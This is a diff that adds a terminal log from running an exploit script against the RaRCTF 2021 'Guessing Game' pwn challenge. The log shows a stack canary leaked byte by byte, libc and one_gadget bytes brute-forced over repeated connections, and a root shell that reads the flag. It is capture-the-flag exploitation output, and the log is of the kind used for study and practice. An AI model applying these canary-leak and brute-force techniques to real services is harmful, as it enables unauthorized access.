@@ -1,0 +1,330 @@
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300$ python3 solve.py  r
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+i = 0
+[+] Opening connection to 193.57.159.27 on port 59721: Done
+i= 0 , r = 0x79
+i= 1 , r = 0xd8
+i= 2 , r = 0xca
+i= 3 , r = 0x25
+i= 4 , r = 0x7
+i= 5 , r = 0x67
+i= 6 , r = 0xb0
+canary = 0x79d8ca250767b000
+libc_3byte = 0xcf
+one_gadget_3byte = 0xdb
+[*] Closed connection to 193.57.159.27 port 59721
+i = 1
+[+] Opening connection to 193.57.159.27 on port 59721: Done
+i= 0 , r = 0xc4
+i= 1 , r = 0x65
+i= 2 , r = 0xa0
+i= 3 , r = 0xdb
+i= 4 , r = 0x66
+i= 5 , r = 0x49
+i= 6 , r = 0xc8
+canary = 0xc465a0db6649c800
+libc_3byte = 0xdd
+one_gadget_3byte = 0xe9
+[*] Closed connection to 193.57.159.27 port 59721
+i = 2
+[+] Opening connection to 193.57.159.27 on port 59721: Done
+i= 0 , r = 0xdd
+i= 1 , r = 0x67
+i= 2 , r = 0xec
+i= 3 , r = 0x5
+i= 4 , r = 0xb7
+i= 5 , r = 0xc8
+i= 6 , r = 0x59
+canary = 0xdd67ec05b7c85900
+libc_3byte = 0x57
+one_gadget_3byte = 0x63
+[*] Closed connection to 193.57.159.27 port 59721
+i = 3
+[+] Opening connection to 193.57.159.27 on port 59721: Done
+i= 0 , r = 0x33
+i= 1 , r = 0xce
+i= 2 , r = 0x66
+i= 3 , r = 0x8b
+i= 4 , r = 0xc
+i= 5 , r = 0x2e
+i= 6 , r = 0xbd
+canary = 0x33ce668b0c2ebd00
+libc_3byte = 0xdc
+one_gadget_3byte = 0xe8
+[*] Closed connection to 193.57.159.27 port 59721
+i = 4
+[+] Opening connection to 193.57.159.27 on port 59721: Done
+i= 0 , r = 0xff
+i= 1 , r = 0x2d
+i= 2 , r = 0x4a
+i= 3 , r = 0x5a
+i= 4 , r = 0x4d
+i= 5 , r = 0xb7
+i= 6 , r = 0x85
+canary = 0xff2d4a5a4db78500
+libc_3byte = 0x2
+one_gadget_3byte = 0xe
+b'uid=0(root) gid=0(root) groups=0(root)\n'
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ ls
+bin
+boot
+core.10
+core.100
+core.101
+core.102
+core.103
+core.104
+core.105
+core.106
+core.107
+core.108
+core.109
+core.111
+core.112
+core.113
+core.114
+core.115
+core.116
+core.117
+core.119
+core.12
+core.120
+core.122
+core.123
+core.124
+core.125
+core.126
+core.127
+core.128
+core.129
+core.130
+core.131
+core.132
+core.133
+core.134
+core.135
+core.137
+core.138
+core.140
+core.142
+core.144
+core.145
+core.146
+core.147
+core.148
+core.149
+core.150
+core.151
+core.153
+core.154
+core.155
+core.156
+core.157
+core.158
+core.159
+core.16
+core.160
+core.161
+core.162
+core.163
+core.164
+core.165
+core.166
+core.167
+core.169
+core.170
+core.171
+core.172
+core.173
+core.175
+core.176
+core.177
+core.178
+core.179
+core.18
+core.180
+core.181
+core.182
+core.183
+core.184
+core.185
+core.186
+core.187
+core.188
+core.189
+core.19
+core.190
+core.192
+core.194
+core.198
+core.20
+core.200
+core.202
+core.204
+core.206
+core.208
+core.21
+core.212
+core.214
+core.216
+core.218
+core.22
+core.220
+core.222
+core.224
+core.226
+core.228
+core.230
+core.232
+core.234
+core.236
+core.238
+core.24
+core.240
+core.242
+core.244
+core.246
+core.248
+core.25
+core.250
+core.252
+core.254
+core.256
+core.258
+core.26
+core.260
+core.262
+core.264
+core.266
+core.268
+core.270
+core.272
+core.274
+core.276
+core.278
+core.28
+core.280
+core.282
+core.284
+core.286
+core.288
+core.290
+core.292
+core.294
+core.296
+core.298
+core.30
+core.300
+core.302
+core.304
+core.306
+core.308
+core.310
+core.312
+core.314
+core.316
+core.318
+core.32
+core.320
+core.321
+core.322
+core.324
+core.326
+core.328
+core.330
+core.332
+core.334
+core.336
+core.338
+core.34
+core.340
+core.342
+core.344
+core.346
+core.348
+core.350
+core.354
+core.356
+core.358
+core.36
+core.360
+core.38
+core.40
+core.41
+core.42
+core.43
+core.45
+core.47
+core.48
+core.49
+core.50
+core.51
+core.52
+core.53
+core.54
+core.55
+core.56
+core.57
+core.58
+core.59
+core.60
+core.61
+core.62
+core.63
+core.64
+core.65
+core.66
+core.68
+core.69
+core.70
+core.71
+core.72
+core.74
+core.75
+core.76
+core.77
+core.78
+core.8
+core.80
+core.82
+core.84
+core.86
+core.88
+core.90
+core.92
+core.94
+core.96
+core.97
+core.98
+dev
+etc
+flag.txt
+guardaQueSeBorraElFlag
+guess
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$ cat flag.txt
+rarctf{4nd_th3y_s41d_gu3ss1ng_1snt_fun!!_c9cbd665}
